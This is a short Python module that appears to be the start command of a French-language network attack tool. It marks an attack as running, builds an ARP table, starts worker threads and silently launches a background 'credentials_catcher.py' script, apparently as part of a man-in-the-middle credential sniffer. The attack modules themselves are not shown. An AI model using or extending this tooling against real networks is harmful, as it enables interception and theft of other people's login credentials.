import sys
import os
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'corethreads')))
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from environment import *
import threading
import subprocess
from corethreads.coremanager import manager
from corethreads.arptable import arptable

def start_command(params):

	if ATTACK_STATUS['status'] == 0 and ATTACK_STATUS['wspid'] == 0:

		ATTACK_STATUS['status'] = 1

		thread0 = threading.Thread(target=arptable)
		thread0.start()
		thread0.join()

		manager.start_threads()

		process = subprocess.Popen(["python3", "corethreads/credentials_catcher.py"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
		ATTACK_STATUS['wspid'] = process.pid

		return

	else:

		print("Attaque déja démarrée");
